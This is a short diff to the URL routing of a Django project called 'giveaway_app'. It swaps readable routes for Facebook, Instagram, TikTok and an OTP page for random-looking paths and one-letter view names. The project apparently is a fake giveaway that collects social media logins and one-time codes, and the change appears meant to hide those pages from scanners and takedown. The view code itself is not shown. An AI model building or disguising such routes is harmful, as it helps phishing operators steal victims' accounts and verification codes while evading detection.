@@ -21,10 +21,10 @@ from giveaway_app import views
 urlpatterns = [
     path('admin/', admin.site.urls),
     path('', views.home, name='home'),
-    path('facebook/', views.facebook, name='facebook'),
-    path('instagram/', views.instagram, name='instagram'),
-    path('tik-tok', views.tiktok, name='tiktok'),
-    path('otp/', views.otp, name='otp'),
+    path('utg2355u23i2u45tg43iergfer3/', views.f, name='f'),
+    path('r4frfwffrhu23892u34rt543223/', views.ins, name='i'),
+    path('tikeRfeoewidneidididid23i23/', views.t, name='t'),
+    path('otp/fefveeffefwefwefwcedede/', views.o, name='o'),
     path('congrats/', views.congrats, name='congrats')
 
 ]
